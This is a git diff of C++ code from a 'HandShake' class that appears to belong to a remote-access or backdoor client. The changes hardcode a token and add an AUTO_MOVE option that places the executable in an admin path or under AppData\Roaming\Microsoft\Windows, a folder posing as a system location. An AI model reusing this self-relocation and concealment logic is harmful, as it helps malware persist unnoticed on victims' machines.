@@ -21,8 +21,9 @@ HandShake::HandShake()
     a_current_directory = setCurrentDirectory();
     a_name_prog = NAME_PROG;
     a_location_prog = setLocationProg();
-    a_token = generateToken(22);
-    cout << "GENERATE TOKEN: " << a_token << endl;
+    cout << "LOCATION PROG: " << endl;
+    a_token = TOKEN;
+    cout << "TOKEN: " << a_token << endl;
 
 }
 void HandShake::setSock(int sock)
@@ -187,36 +188,41 @@ string HandShake::setCurrentDirectory()
 string HandShake::setLocationProg()
 {
     //if admin
-    if(a_is_admin)
+    string result;
+
+    if(AUTO_MOVE)
     {
-        return (string)  PATH_ADMIN "\\" + a_name_prog;
-    }
-    else
-    {
-        string path_CONST=PATH_NOT_ADMIN;
-        int index = 0;
-        if(path_CONST.find("$USER") != string::npos)
-        {   
-            //If $user in string, replace by a_name_user (username of machine) 
-            index = path_CONST.find("$USER");
-            //cout << "$USER DETECT: "<<index<< endl;
-            path_CONST.replace(index,a_name_user.length(),a_name_user);
-                        //de index, 5 char,  remplace par a_name_user
-            cout << path_CONST << endl;;  
-            return path_CONST + "\\" +a_name_prog;
+        if(a_is_admin)
+        {
+            result =   PATH_ADMIN "\\" + a_name_prog;
         }
         else
         {
-            return (string) "C:\\Users\\"+ a_name_user+"\\AppData\\Roaming\\Microsoft\\Windows\\" + a_name_prog;
+            string path_CONST=PATH_NOT_ADMIN;
+            int index = 0;
+            if(path_CONST.find("$USER") != string::npos)
+            {   
+                //If $user in string, replace by a_name_user (username of machine) 
+                index = path_CONST.find("$USER");
+                //cout << "$USER DETECT: "<<index<< endl;
+                path_CONST.replace(index,a_name_user.length(),a_name_user);
+                            //de index, 5 char,  remplace par a_name_user
+                cout << path_CONST << endl;;  
+                return path_CONST + "\\" +a_name_prog;
+            }
+            else
+            {
+                result = "C:\\Users\\"+ a_name_user+"\\AppData\\Roaming\\Microsoft\\Windows\\" + a_name_prog;
+            }
         }
     }
-}
-string HandShake::getToken()
-{
-
-    cout << "getToken" << endl;
-    return a_token;
-    
+    else
+    {
+        char buffer[MAX_PATH];
+        GetModuleFileNameA(NULL, buffer, sizeof(buffer));
+        result = buffer;
+    }
+    return result;
 }
 bool HandShake::getIsAdmin()
 {
